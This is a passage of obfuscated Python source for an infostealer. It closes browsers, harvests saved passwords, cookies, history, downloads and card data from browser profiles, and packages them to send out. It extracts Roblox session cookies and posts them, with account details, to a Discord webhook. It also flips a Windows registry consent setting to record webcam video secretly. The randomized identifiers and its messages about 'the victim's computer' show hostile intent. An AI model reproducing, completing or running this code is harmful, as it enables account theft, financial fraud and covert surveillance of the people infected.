        'Mozilla Firefox': 'firefox.exe',
        'Safari': 'safari.exe',
    }
        
    CMREURPHTXBPIMUNVCLYPJEZSHHAVBMEDLLKGAQTDMBUWXAYSPPFDHWLAEEIVWWJTASNVTOJMBIRFGIACXSTYBK = [
        '', 'Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5'
    ]

    try:
        for browser, proc_name in BIOTVBAOWYEWLBIYDEOMAKVJATPGVNUJWNVSDUTJAKKSVEKAIWXS_Processes.items():
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    if proc.name().lower() == proc_name.lower():
                        proc.terminate()
                except: pass
    except: pass

    for JYZGYRJJKPTGUGZZMCDQYJWFMESELTINPVRMWWMKXXDGWFODQIMIMPXBJORKWXYLJBFBGYWHIDAGWNBVMWRTZPZRQLCLX, RHFHTPZYBPWMTUMJANPTWOTALOJEDSSRUXTDADHUQHRSXVVAZFMSXOECYFACMOLCQANCWLKZCMEFN in BIOTVBAOWYEWLBIYDEOMAKVJATPGVNUJWNVSDUTJAKKSVEKAIWXS.items():
        if not os.path.exists(RHFHTPZYBPWMTUMJANPTWOTALOJEDSSRUXTDADHUQHRSXVVAZFMSXOECYFACMOLCQANCWLKZCMEFN):
            continue

        EWLMDVZDZEZCQTDUATHJSSJFFITUZEEOTIZCBOQMMNJZMDCMZCSRGEUUYAZYLESRZGLS = PEYRCWERMSKUSHMMZYUBELJTTRQVIXCXVCURJHKLNTZARHSAIQLYEMDYVMCGNCNKDRWT(os.path.join(RHFHTPZYBPWMTUMJANPTWOTALOJEDSSRUXTDADHUQHRSXVVAZFMSXOECYFACMOLCQANCWLKZCMEFN, 'Local State'))
        if not EWLMDVZDZEZCQTDUATHJSSJFFITUZEEOTIZCBOQMMNJZMDCMZCSRGEUUYAZYLESRZGLS:
            continue

        for v4r_profile in CMREURPHTXBPIMUNVCLYPJEZSHHAVBMEDLLKGAQTDMBUWXAYSPPFDHWLAEEIVWWJTASNVTOJMBIRFGIACXSTYBK:
            IPYSIXGMTHWATFPJUZYSIENXYMCUGFDKDTJBYLMNEECRRKHKGGEXVXYWWVQLZFYPYE = os.path.join(RHFHTPZYBPWMTUMJANPTWOTALOJEDSSRUXTDADHUQHRSXVVAZFMSXOECYFACMOLCQANCWLKZCMEFN, v4r_profile)
            if not os.path.exists(IPYSIXGMTHWATFPJUZYSIENXYMCUGFDKDTJBYLMNEECRRKHKGGEXVXYWWVQLZFYPYE):
                continue
            
            try: IXBBQNMJYASDASSAZKGODBDHSDBWOKONEJDJFRRGRWDRRKORGOAPYHTENSKHGGJGQSROLIUSTTQI(JYZGYRJJKPTGUGZZMCDQYJWFMESELTINPVRMWWMKXXDGWFODQIMIMPXBJORKWXYLJBFBGYWHIDAGWNBVMWRTZPZRQLCLX, IPYSIXGMTHWATFPJUZYSIENXYMCUGFDKDTJBYLMNEECRRKHKGGEXVXYWWVQLZFYPYE, EWLMDVZDZEZCQTDUATHJSSJFFITUZEEOTIZCBOQMMNJZMDCMZCSRGEUUYAZYLESRZGLS)
            except: pass
            try: CKDPQEJZSEMSHTTRHIISRWCOELTFQORVFBUSQIQXSFXYYFYECUTRFAXVGX(JYZGYRJJKPTGUGZZMCDQYJWFMESELTINPVRMWWMKXXDGWFODQIMIMPXBJORKWXYLJBFBGYWHIDAGWNBVMWRTZPZRQLCLX, IPYSIXGMTHWATFPJUZYSIENXYMCUGFDKDTJBYLMNEECRRKHKGGEXVXYWWVQLZFYPYE, EWLMDVZDZEZCQTDUATHJSSJFFITUZEEOTIZCBOQMMNJZMDCMZCSRGEUUYAZYLESRZGLS)
            except: pass
            try: KJJBXAESWTSXXPGZBPRREYSBWKPFPBNWSDLZUZKDNNVPOPPKZRNQDAWFDAXKJTNWKCUDOXCCISQQFMUD(JYZGYRJJKPTGUGZZMCDQYJWFMESELTINPVRMWWMKXXDGWFODQIMIMPXBJORKWXYLJBFBGYWHIDAGWNBVMWRTZPZRQLCLX, IPYSIXGMTHWATFPJUZYSIENXYMCUGFDKDTJBYLMNEECRRKHKGGEXVXYWWVQLZFYPYE)
            except: pass
            try: DMMOWEDXFFCEZEQXUHETNSCAXDTWGWGNJQGJLEYJLDZJXJBRHGWUDQGSODEJRYHCPFGDBWNVIFXTFXQBYDK(JYZGYRJJKPTGUGZZMCDQYJWFMESELTINPVRMWWMKXXDGWFODQIMIMPXBJORKWXYLJBFBGYWHIDAGWNBVMWRTZPZRQLCLX, IPYSIXGMTHWATFPJUZYSIENXYMCUGFDKDTJBYLMNEECRRKHKGGEXVXYWWVQLZFYPYE)
            except: pass
            try: TIWRROHRQQMTSNAHTYIPVEOCRZJTNIZHEAPDFZBUJUENYJOZNSDMNISORLQJBONNFJIEJROCECSIWHOFGXUIBL(JYZGYRJJKPTGUGZZMCDQYJWFMESELTINPVRMWWMKXXDGWFODQIMIMPXBJORKWXYLJBFBGYWHIDAGWNBVMWRTZPZRQLCLX, IPYSIXGMTHWATFPJUZYSIENXYMCUGFDKDTJBYLMNEECRRKHKGGEXVXYWWVQLZFYPYE, EWLMDVZDZEZCQTDUATHJSSJFFITUZEEOTIZCBOQMMNJZMDCMZCSRGEUUYAZYLESRZGLS)
            except: pass

            if JYZGYRJJKPTGUGZZMCDQYJWFMESELTINPVRMWWMKXXDGWFODQIMIMPXBJORKWXYLJBFBGYWHIDAGWNBVMWRTZPZRQLCLX not in BDTVTCMYZJLVNNQMMBIOZKKLHSOFVTAOATULGWDODMQUZDBJTYJIAGVCAKATQDTEATAGTVCNYKVSCPBBGBARKGVFNH:
                BDTVTCMYZJLVNNQMMBIOZKKLHSOFVTAOATULGWDODMQUZDBJTYJIAGVCAKATQDTEATAGTVCNYKVSCPBBGBARKGVFNH.append(JYZGYRJJKPTGUGZZMCDQYJWFMESELTINPVRMWWMKXXDGWFODQIMIMPXBJORKWXYLJBFBGYWHIDAGWNBVMWRTZPZRQLCLX)
            
    if not STTZRJWCCHHUMBEJPIOXFBZXQFKZYGWSXQFSOBAZECYLFKRYIXM:
        STTZRJWCCHHUMBEJPIOXFBZXQFKZYGWSXQFSOBAZECYLFKRYIXM.append("No passwords was saved on the victim's computer")
    if not QVGZHDHJCLQSMHPOXYMRPYNZGXDCHPKICJCKKKDREFEBBWCXKVZ:
        QVGZHDHJCLQSMHPOXYMRPYNZGXDCHPKICJCKKKDREFEBBWCXKVZ.append("No cookies was saved on the victim's computer")
    if not QTRZVXYQWKPXPUVIKJERWAVLQJSKXCHZLQZNSEIIFOJEUWPTYFHXUNWUCTMGGBZYN:
        QTRZVXYQWKPXPUVIKJERWAVLQJSKXCHZLQZNSEIIFOJEUWPTYFHXUNWUCTMGGBZYN.append("No history was saved on the victim's computer")
    if not GYARZCWKUSOAFVXFATWAXQLHHMVLPUIKEDERKMQCCTXWIZPKXPSAWOXFVLCJRXWDBFGBVPJDMHHVVBOOXFDEZFQDEBBX:
        GYARZCWKUSOAFVXFATWAXQLHHMVLPUIKEDERKMQCCTXWIZPKXPSAWOXFVLCJRXWDBFGBVPJDMHHVVBOOXFDEZFQDEBBX.append("No downloads was saved on the victim's computer")
    if not RRZIMTMCXRZUOFBLMNJAJFRXLZEUXLBRBWOCAVDGDCQDVWVWQQCERIYRPUXCTCQSQNXWDQWENAZVOIWXGSPSNJVS:
        RRZIMTMCXRZUOFBLMNJAJFRXLZEUXLBRBWOCAVDGDCQDVWVWQQCERIYRPUXCTCQSQNXWDQWENAZVOIWXGSPSNJVS.append("No card was saved on the victim's computer")

    zip_in_memory = FTXMUWPNJTKPHTRQGPGUBGOEOTPFLMUGAFYMPLISRIFZDKCMYQRXXYSHUIPSNWRRXOEKJYHOQPRAPHUSWO(XOYHKLJCXKLVFJWTDZUNBZFVHSMTDQHZTXLYIEKHTAKTTYLFWPKVIOSAIZC)
    AVMATKWALFDAWMLKXXZRQHAFROGOXEAWHYPAUWGGEBWFGIIJDVT(XOYHKLJCXKLVFJWTDZUNBZFVHSMTDQHZTXLYIEKHTAKTTYLFWPKVIOSAIZC, zip_in_memory)

def EZUBFDNYIZFPKWUARMNFBJIPEKNTEKPKMJOWJZTGTNFJJKKJLRLDFUOTLRDT():
    import browser_cookie3
    import requests
    import json
    from discord import SyncWebhook
    import discord

    CPCTHSZRBHIKOWNDBSWNQBLHXBLOJPWGKENYZXJUACHHHYXFKZNQGRIFEQTIKSEEIIWEMABQWXZPQNHSUVKBNHXGOIX = []
    def HBBBRCSWWEOPWWIQYMGIZEQVPEQTKQXXVKXVOJENEZUVEHPFUWHNZFJGVGSHBNMYKDSYYTSUVX(KTAQMXNBPAWBNKFTZGKEFUFTSNMMWYBOSODQOWSLMAHFIXYEEIUSNVJJTDBGRGAWAHMCBLWLNBYHDPHQCMNJOPV):
        try:
            MSUSLXDCUELBJGHXKIEGXOPTNZXBZUORVQKZRWMANATKZELSEDZOJYFOUODABHRYUOCMNIWDLBZZEWPZBDIRUEON = KTAQMXNBPAWBNKFTZGKEFUFTSNMMWYBOSODQOWSLMAHFIXYEEIUSNVJJTDBGRGAWAHMCBLWLNBYHDPHQCMNJOPV()
            MSUSLXDCUELBJGHXKIEGXOPTNZXBZUORVQKZRWMANATKZELSEDZOJYFOUODABHRYUOCMNIWDLBZZEWPZBDIRUEON = str(MSUSLXDCUELBJGHXKIEGXOPTNZXBZUORVQKZRWMANATKZELSEDZOJYFOUODABHRYUOCMNIWDLBZZEWPZBDIRUEON)
            SVQZWWLWVJHEGLMBXHZNREUSZNABMOBZZMYWEOOSSZBTPXENFNWCENWVYOOOBIARJHWBUQXJOUK = MSUSLXDCUELBJGHXKIEGXOPTNZXBZUORVQKZRWMANATKZELSEDZOJYFOUODABHRYUOCMNIWDLBZZEWPZBDIRUEON.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
            PAFHNYNBHGWNSLPZOXMHBYPMFLLTSQAQENVRDDKMGKJWNKQWWHBJCXBDRHCXVHPFZBNOAZYRDMYZF = KTAQMXNBPAWBNKFTZGKEFUFTSNMMWYBOSODQOWSLMAHFIXYEEIUSNVJJTDBGRGAWAHMCBLWLNBYHDPHQCMNJOPV.__name__
            return SVQZWWLWVJHEGLMBXHZNREUSZNABMOBZZMYWEOOSSZBTPXENFNWCENWVYOOOBIARJHWBUQXJOUK, PAFHNYNBHGWNSLPZOXMHBYPMFLLTSQAQENVRDDKMGKJWNKQWWHBJCXBDRHCXVHPFZBNOAZYRDMYZF
        except:
            return None, None

    def RLDGMZQQUFNCZNHEPPKVRVLLIONWKUDQLZUSCBRFLVRBOTGKJUBPVDCNZZI():
        return browser_cookie3.edge(domain_name="roblox.com")

    def RUHKHYFHITHEEIUOWCDJTSLUTWWJUXUMVZCVLVHMDYNCSBVMSUAGJV():
        return browser_cookie3.chrome(domain_name="roblox.com")

    def LILLWOTQBDQUNEFGBNWCPITVDNJUXJCBSWXEUMDGYPMPNGVTATVHBESBHIYBYRXLTZBFFIJSOZAQIUJZSWMQYNXYL():
        return browser_cookie3.firefox(domain_name="roblox.com")

    def RTCEPNMJEIFGCWTDXPMQKUXZDFXOCFVDYUYLGHPGDEESGYULAMHNXQEWVIQJNOGGITKQATHSISZNMBPQJNYWYASNBAEUDIPSD():
        return browser_cookie3.opera(domain_name="roblox.com")
    
    def RTCEPNMJEIFGCWTDXPMQKUXZDFXOCFVDYUYLGHPGDEESGYULAMHNXQEWVIQJNOGGITKQATHSISZNMBPQJNYWYASNBAEUDIPSDGX():
        return browser_cookie3.opera_gx(domain_name="roblox.com")

    def LASALRVZONBOYVGIKTCKIVUWKEANDYWCQCSKKTMZOJATBJVUZIUBLPIPGSAMSIOVSCORLKPIUTRUSD():
        return browser_cookie3.safari(domain_name="roblox.com")

    def YIRPJCUYXKIOIWAVVFMQJWERCERVSGDHXCMTJOPVILYSICCKDKOULKJTEMPSVNJNYTEQDVHWOFIGQANCYWLWGDSFIKPUBZRQKH():
        return browser_cookie3.brave(domain_name="roblox.com")

    TZPAEUVUWNYFKXVBMTNKYCFOAKCTCRKEAXMKSFKDBWXEDIUHSFFKJQKWKORYVZLJOTNNVVCQOPH = [RLDGMZQQUFNCZNHEPPKVRVLLIONWKUDQLZUSCBRFLVRBOTGKJUBPVDCNZZI, RUHKHYFHITHEEIUOWCDJTSLUTWWJUXUMVZCVLVHMDYNCSBVMSUAGJV, LILLWOTQBDQUNEFGBNWCPITVDNJUXJCBSWXEUMDGYPMPNGVTATVHBESBHIYBYRXLTZBFFIJSOZAQIUJZSWMQYNXYL, RTCEPNMJEIFGCWTDXPMQKUXZDFXOCFVDYUYLGHPGDEESGYULAMHNXQEWVIQJNOGGITKQATHSISZNMBPQJNYWYASNBAEUDIPSD, RTCEPNMJEIFGCWTDXPMQKUXZDFXOCFVDYUYLGHPGDEESGYULAMHNXQEWVIQJNOGGITKQATHSISZNMBPQJNYWYASNBAEUDIPSDGX, LASALRVZONBOYVGIKTCKIVUWKEANDYWCQCSKKTMZOJATBJVUZIUBLPIPGSAMSIOVSCORLKPIUTRUSD, YIRPJCUYXKIOIWAVVFMQJWERCERVSGDHXCMTJOPVILYSICCKDKOULKJTEMPSVNJNYTEQDVHWOFIGQANCYWLWGDSFIKPUBZRQKH]
    for v4r_br0ws3r in TZPAEUVUWNYFKXVBMTNKYCFOAKCTCRKEAXMKSFKDBWXEDIUHSFFKJQKWKORYVZLJOTNNVVCQOPH:
        v4r_c00ki3, PAFHNYNBHGWNSLPZOXMHBYPMFLLTSQAQENVRDDKMGKJWNKQWWHBJCXBDRHCXVHPFZBNOAZYRDMYZF = HBBBRCSWWEOPWWIQYMGIZEQVPEQTKQXXVKXVOJENEZUVEHPFUWHNZFJGVGSHBNMYKDSYYTSUVX(v4r_br0ws3r)
        if v4r_c00ki3:
            if v4r_c00ki3 not in CPCTHSZRBHIKOWNDBSWNQBLHXBLOJPWGKENYZXJUACHHHYXFKZNQGRIFEQTIKSEEIIWEMABQWXZPQNHSUVKBNHXGOIX:
                CPCTHSZRBHIKOWNDBSWNQBLHXBLOJPWGKENYZXJUACHHHYXFKZNQGRIFEQTIKSEEIIWEMABQWXZPQNHSUVKBNHXGOIX.append(v4r_c00ki3)
                try:
                    SNSPTJDQBYFCKBJCSVXJENNDNFPGNJUQLMJUQKDFYPMPIDMZGSFPZKIMONOWZLIHYTPNVBKJH = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": v4r_c00ki3})
                    RWJBOTNMFSHBWVLRFNBWRQBFSNSSIXMCNYTJUOXMAOYUHEEUXLBDSFRBAJUFBYYDVTCAAAVVRSTNWEFRQVMGMRGQBRRJLHOHRGW = json.loads(SNSPTJDQBYFCKBJCSVXJENNDNFPGNJUQLMJUQKDFYPMPIDMZGSFPZKIMONOWZLIHYTPNVBKJH.text)
                except:
                    pass

                UJOFRVLFGMMDOAPJBPPWWFSCQCSELCBPXCEJBIKOHIFJRGNRYQNSOIJQTTVTLNGEQWSSLN = RWJBOTNMFSHBWVLRFNBWRQBFSNSSIXMCNYTJUOXMAOYUHEEUXLBDSFRBAJUFBYYDVTCAAAVVRSTNWEFRQVMGMRGQBRRJLHOHRGW.get('id', "None")
                XUYKLHXPTZVYUHYWZMDQTXLYOODGGFSJMWPDGLHWWWPPVKYFITAUXZDVZQCYADCCQFDAJCHCCZKGWQEWNBKBUYDBNAMGDQUDA = RWJBOTNMFSHBWVLRFNBWRQBFSNSSIXMCNYTJUOXMAOYUHEEUXLBDSFRBAJUFBYYDVTCAAAVVRSTNWEFRQVMGMRGQBRRJLHOHRGW.get('displayName', "None")
                GRZNDCSKFPLLOZJRYIVQGZONLVFEYVIVXPCNZDXJWXXUHZTQSPMOUTP = RWJBOTNMFSHBWVLRFNBWRQBFSNSSIXMCNYTJUOXMAOYUHEEUXLBDSFRBAJUFBYYDVTCAAAVVRSTNWEFRQVMGMRGQBRRJLHOHRGW.get('name', "None")
                FGCFHWPAMGJIQSHHNFMXIWZNEWLBECCLMADRIDJKXSXPJQFEJS = RWJBOTNMFSHBWVLRFNBWRQBFSNSSIXMCNYTJUOXMAOYUHEEUXLBDSFRBAJUFBYYDVTCAAAVVRSTNWEFRQVMGMRGQBRRJLHOHRGW.get("RobuxBalance", "None")
                XBSZCCXOXYQWNYNTBXKLVCFKGEODIXGHJTAFFRXJOUAACNGFWUUJBBWRJPT = RWJBOTNMFSHBWVLRFNBWRQBFSNSSIXMCNYTJUOXMAOYUHEEUXLBDSFRBAJUFBYYDVTCAAAVVRSTNWEFRQVMGMRGQBRRJLHOHRGW.get("IsPremium", "None")
                FTURJNXWUXCHUTSZTVYCAQRMVTZTNYZFDJUPCKNXXWRBQXAVYXJMQ = RWJBOTNMFSHBWVLRFNBWRQBFSNSSIXMCNYTJUOXMAOYUHEEUXLBDSFRBAJUFBYYDVTCAAAVVRSTNWEFRQVMGMRGQBRRJLHOHRGW.get("ThumbnailUrl", "None")
                EPLIRFXWSBUNGMILYKYVAQLILBDKAEWTBYOYKQZGPSYOSWVNYKQUZXYPTAHIOIFICPMGBE = RWJBOTNMFSHBWVLRFNBWRQBFSNSSIXMCNYTJUOXMAOYUHEEUXLBDSFRBAJUFBYYDVTCAAAVVRSTNWEFRQVMGMRGQBRRJLHOHRGW.get("IsAnyBuildersClubMember", "None")
        
                NHSZDDVQOIPTVDZUGEOLNFBPDCYLMUKBXUSTVSGWZONFYHAUJQCMUJFNBGASCA = len(v4r_c00ki3)
                KCIQOHMDGROKSYRPHOAWCDNWNICMREPTZOIYSGGAOEJPWVZMIGMOAKUA = NHSZDDVQOIPTVDZUGEOLNFBPDCYLMUKBXUSTVSGWZONFYHAUJQCMUJFNBGASCA // 2
                ZQEXFQYWZCKGSJGVFGKLDKAYBXZMLPBCJFRYYRZGETGUSEODONESANUVUGQJFKOQXPDVRMZTHXZOCQAPEWOLQRY = v4r_c00ki3[:KCIQOHMDGROKSYRPHOAWCDNWNICMREPTZOIYSGGAOEJPWVZMIGMOAKUA]
                NJOOVFTWXCWQXLRFAWLXAPMPXTUMTWOUZNYHPGEMNORNBVPXCTDMRJZBWFBAMZZRDOWGSNPFJPTMRHHGDGQESAWAV = v4r_c00ki3[KCIQOHMDGROKSYRPHOAWCDNWNICMREPTZOIYSGGAOEJPWVZMIGMOAKUA:]

                CUDONGQCHGZZPKNWUXEGYEUFSCLFBJLNWSNDAKZYKQZGWXXDPSK = SyncWebhook.from_url(RHBNWCWDYPBZAEVPZSBPCLCIXCKMGIPYFPMVCSONFKZZVCTAHZRIQ)

                AVDFEEMDRMVPLUVANTXNPYECGWCIABPSAAQVONCZGABNWADYQXGFTNRDIWPMOUEJYKQR = discord.Embed(
                    title=f'Roblox Cookie {NADSFPUELPXXMDMXIWFCEXTCECYDVOPQLAAQJNETRHOJSZHRLXCXTAAFAURGBBGOJADMMKVCB}:',
                    color=EFSWMHTVETEZDWCBKEMXAHVZPLFCGFWCLUZCRFJJEYNSKRYGLNTPRUYW
                )
                AVDFEEMDRMVPLUVANTXNPYECGWCIABPSAAQVONCZGABNWADYQXGFTNRDIWPMOUEJYKQR.set_footer(text=GSKOYQBPLTAZTJYETFJLNDYOMYNWBGHBUBBACGZNJYAZRFKGVAXHTWEPOYWZMIPNHRWKOCQMKCFWQZGTWYSHYEIPUIJQTGHGIUY, icon_url=HCZWNWNKJPEZYZAXSIFDFXNEOZSCMRNIYTWIZJHOQHRTKDFMTZHGQCNFTKYMMPIFVSKPLBSRXXLEAPAQHXWZXWAAZQ)
                AVDFEEMDRMVPLUVANTXNPYECGWCIABPSAAQVONCZGABNWADYQXGFTNRDIWPMOUEJYKQR.set_thumbnail(url=FTURJNXWUXCHUTSZTVYCAQRMVTZTNYZFDJUPCKNXXWRBQXAVYXJMQ)
                AVDFEEMDRMVPLUVANTXNPYECGWCIABPSAAQVONCZGABNWADYQXGFTNRDIWPMOUEJYKQR.add_field(name=":compass: Navigator:", value=f"```{PAFHNYNBHGWNSLPZOXMHBYPMFLLTSQAQENVRDDKMGKJWNKQWWHBJCXBDRHCXVHPFZBNOAZYRDMYZF}```", inline=True)
                AVDFEEMDRMVPLUVANTXNPYECGWCIABPSAAQVONCZGABNWADYQXGFTNRDIWPMOUEJYKQR.add_field(name=":bust_in_silhouette: Username:", value=f"```{GRZNDCSKFPLLOZJRYIVQGZONLVFEYVIVXPCNZDXJWXXUHZTQSPMOUTP}```", inline=True)
                AVDFEEMDRMVPLUVANTXNPYECGWCIABPSAAQVONCZGABNWADYQXGFTNRDIWPMOUEJYKQR.add_field(name=":bust_in_silhouette: DisplayName:", value=f"```{XUYKLHXPTZVYUHYWZMDQTXLYOODGGFSJMWPDGLHWWWPPVKYFITAUXZDVZQCYADCCQFDAJCHCCZKGWQEWNBKBUYDBNAMGDQUDA}```", inline=True)
                AVDFEEMDRMVPLUVANTXNPYECGWCIABPSAAQVONCZGABNWADYQXGFTNRDIWPMOUEJYKQR.add_field(name=":robot: Id:", value=f"```{UJOFRVLFGMMDOAPJBPPWWFSCQCSELCBPXCEJBIKOHIFJRGNRYQNSOIJQTTVTLNGEQWSSLN}```", inline=True)
                AVDFEEMDRMVPLUVANTXNPYECGWCIABPSAAQVONCZGABNWADYQXGFTNRDIWPMOUEJYKQR.add_field(name=":moneybag: Robux:", value=f"```{FGCFHWPAMGJIQSHHNFMXIWZNEWLBECCLMADRIDJKXSXPJQFEJS}```", inline=True)
                AVDFEEMDRMVPLUVANTXNPYECGWCIABPSAAQVONCZGABNWADYQXGFTNRDIWPMOUEJYKQR.add_field(name=":tickets: Premium:", value=f"```{XBSZCCXOXYQWNYNTBXKLVCFKGEODIXGHJTAFFRXJOUAACNGFWUUJBBWRJPT}```", inline=True)
                AVDFEEMDRMVPLUVANTXNPYECGWCIABPSAAQVONCZGABNWADYQXGFTNRDIWPMOUEJYKQR.add_field(name=":construction_site: Builders Club:", value=f"```{EPLIRFXWSBUNGMILYKYVAQLILBDKAEWTBYOYKQZGPSYOSWVNYKQUZXYPTAHIOIFICPMGBE}```", inline=True)
                AVDFEEMDRMVPLUVANTXNPYECGWCIABPSAAQVONCZGABNWADYQXGFTNRDIWPMOUEJYKQR.add_field(name=":cookie: Cookie Part 1:", value=f"```{ZQEXFQYWZCKGSJGVFGKLDKAYBXZMLPBCJFRYYRZGETGUSEODONESANUVUGQJFKOQXPDVRMZTHXZOCQAPEWOLQRY}```", inline=False)
                AVDFEEMDRMVPLUVANTXNPYECGWCIABPSAAQVONCZGABNWADYQXGFTNRDIWPMOUEJYKQR.add_field(name=":cookie: Cookie Part 2:", value=f"```{NJOOVFTWXCWQXLRFAWLXAPMPXTUMTWOUZNYHPGEMNORNBVPXCTDMRJZBWFBAMZZRDOWGSNPFJPTMRHHGDGQESAWAV}```", inline=False)

                CUDONGQCHGZZPKNWUXEGYEUFSCLFBJLNWSNDAKZYKQZGWXXDPSK.send(embed=AVDFEEMDRMVPLUVANTXNPYECGWCIABPSAAQVONCZGABNWADYQXGFTNRDIWPMOUEJYKQR, username=BHXYAAKWQVSJTFCMWFLZQJNUPCRIJWAIGUWXGRRXBCLPNKVDDQMTZUJCDKS,
                                avatar_url=HCZWNWNKJPEZYZAXSIFDFXNEOZSCMRNIYTWIZJHOQHRTKDFMTZHGQCNFTKYMMPIFVSKPLBSRXXLEAPAQHXWZXWAAZQ)
                
    if not CPCTHSZRBHIKOWNDBSWNQBLHXBLOJPWGKENYZXJUACHHHYXFKZNQGRIFEQTIKSEEIIWEMABQWXZPQNHSUVKBNHXGOIX:
        HHNDDPEDUIPODFIEGZPKTOMSYWFILBPGDXPURXRKOSXXDXKNAVCDQSMCXDFKFRJFRXEXQTEICHUWGGKTRQDWLBRKOJCKSZL(
            RHBNWCWDYPBZAEVPZSBPCLCIXCKMGIPYFPMVCSONFKZZVCTAHZRIQ, 
            title=f'Roblox Cookie {NADSFPUELPXXMDMXIWFCEXTCECYDVOPQLAAQJNETRHOJSZHRLXCXTAAFAURGBBGOJADMMKVCB}:', 
            description=f"No roblox cookie found."
        )

def SVILZSOUMACPBBITXCTKUOUDEELEHAUZPLCARGUZDJXJWYUGFCQQFDVKFTLVBHVVDIGGOINBUHTMVSOWYKTMSWETVAUEXLCOH():
    import os
    import cv2
    from discord import SyncWebhook, Embed, File
    from datetime import datetime
    import winreg
    from datetime import datetime

    try:
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore" + r'\webcam', 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, 'Value', 0, winreg.REG_SZ, 'Allow')
            winreg.CloseKey(key)
        except: pass
        DZWXDJAUFSVQEFZSCLGUMQPBXBTHOXURBCQLHBHIDFUTAMOKPT_file_capture = f"CameraCapture_{XOYHKLJCXKLVFJWTDZUNBZFVHSMTDQHZTXLYIEKHTAKTTYLFWPKVIOSAIZC}.avi"

        def C4ptur3(RHFHTPZYBPWMTUMJANPTWOTALOJEDSSRUXTDADHUQHRSXVVAZFMSXOECYFACMOLCQANCWLKZCMEFN_file_capture):
            EMDOKFQJYTKJNWCRAIBAVBPAZNBXBTLJMIWIBQHUILQUQGIIVWHMDHSNXCOBYYZXCEGNZQPAELDMZV_capture = 15
            JVSHYTFGIOPFHVJYUIDYHWOITEDBSPFXJWWMPKGXKPROVXLWTOIABXKAWTABMOOJAMOSMYP = cv2.VideoCapture(0)

            if not JVSHYTFGIOPFHVJYUIDYHWOITEDBSPFXJWWMPKGXKPROVXLWTOIABXKAWTABMOOJAMOSMYP.isOpened():
                HZONQDDAYEICBXJHMFUWBHMUYNUJGGQPTQPAFPIRQCSDZLPTMUASGPEOOAOOEQRLLYETTSYOUZKTHVNRAABGKIPFEJDSYOTGP()
                HHNDDPEDUIPODFIEGZPKTOMSYWFILBPGDXPURXRKOSXXDXKNAVCDQSMCXDFKFRJFRXEXQTEICHUWGGKTRQDWLBRKOJCKSZL(
                    RHBNWCWDYPBZAEVPZSBPCLCIXCKMGIPYFPMVCSONFKZZVCTAHZRIQ, 
                    title=f'Camera Capture {XOYHKLJCXKLVFJWTDZUNBZFVHSMTDQHZTXLYIEKHTAKTTYLFWPKVIOSAIZC} "{EWJJCSAOCFNXFKDMHYUKNMKDPYSKVRINNXJUFYNSSGJTOOKKFLNJOQDBJCWMMBBQEWLMXLLSZBRNBYUCGGJZR}":', 
                    description=f"No cameras found."
                )
                status = "exit"
                return status
            
            WRIQFBOCJLIHQXJOKGUAXHRSYAETRGXEHKOUYXZXUGSTEHPAEYKHFOBVHVZJVUKOG = cv2.VideoWriter_fourcc(*'XVID')
            TODLWLPPNOKXMZYGBOZUVFTJTEZYLGOZLNLMNYDMMZPSMNKBNCVKQBIQBWDCYWAERKFKAUIWKGLOJEPINCUICQKSIJLQ = cv2.VideoWriter(RHFHTPZYBPWMTUMJANPTWOTALOJEDSSRUXTDADHUQHRSXVVAZFMSXOECYFACMOLCQANCWLKZCMEFN_file_capture, WRIQFBOCJLIHQXJOKGUAXHRSYAETRGXEHKOUYXZXUGSTEHPAEYKHFOBVHVZJVUKOG, 20.0, (640, 480))
            EMDOKFQJYTKJNWCRAIBAVBPAZNBXBTLJMIWIBQHUILQUQGIIVWHMDHSNXCOBYYZXCEGNZQPAELDMZV_start = datetime.now()
            while (datetime.now() - EMDOKFQJYTKJNWCRAIBAVBPAZNBXBTLJMIWIBQHUILQUQGIIVWHMDHSNXCOBYYZXCEGNZQPAELDMZV_start).seconds < EMDOKFQJYTKJNWCRAIBAVBPAZNBXBTLJMIWIBQHUILQUQGIIVWHMDHSNXCOBYYZXCEGNZQPAELDMZV_capture:
                v4r_ret, v4r_frame = JVSHYTFGIOPFHVJYUIDYHWOITEDBSPFXJWWMPKGXKPROVXLWTOIABXKAWTABMOOJAMOSMYP.read()
                if not v4r_ret:
                    break
                TODLWLPPNOKXMZYGBOZUVFTJTEZYLGOZLNLMNYDMMZPSMNKBNCVKQBIQBWDCYWAERKFKAUIWKGLOJEPINCUICQKSIJLQ.write(v4r_frame)

            JVSHYTFGIOPFHVJYUIDYHWOITEDBSPFXJWWMPKGXKPROVXLWTOIABXKAWTABMOOJAMOSMYP.release()
            TODLWLPPNOKXMZYGBOZUVFTJTEZYLGOZLNLMNYDMMZPSMNKBNCVKQBIQBWDCYWAERKFKAUIWKGLOJEPINCUICQKSIJLQ.release()
            status = None
            
            return status

        try:
            RHFHTPZYBPWMTUMJANPTWOTALOJEDSSRUXTDADHUQHRSXVVAZFMSXOECYFACMOLCQANCWLKZCMEFN_file_capture = os.path.join(ZFWEVREABKTEYWBXDFLXTMGTYXZJDXZZDFZHTKPKRIBCFVQXNCSEGMUTOFJWCUFMUUBSBNSSCTCZKZBILLEDUCMAHKSAGLZXWQ, 'Documents', DZWXDJAUFSVQEFZSCLGUMQPBXBTHOXURBCQLHBHIDFUTAMOKPT_file_capture)
            status = C4ptur3(RHFHTPZYBPWMTUMJANPTWOTALOJEDSSRUXTDADHUQHRSXVVAZFMSXOECYFACMOLCQANCWLKZCMEFN_file_capture)
        except:
            RHFHTPZYBPWMTUMJANPTWOTALOJEDSSRUXTDADHUQHRSXVVAZFMSXOECYFACMOLCQANCWLKZCMEFN_file_capture = DZWXDJAUFSVQEFZSCLGUMQPBXBTHOXURBCQLHBHIDFUTAMOKPT_file_capture
            status = C4ptur3(RHFHTPZYBPWMTUMJANPTWOTALOJEDSSRUXTDADHUQHRSXVVAZFMSXOECYFACMOLCQANCWLKZCMEFN_file_capture)
        
        if status == "exit":
            return

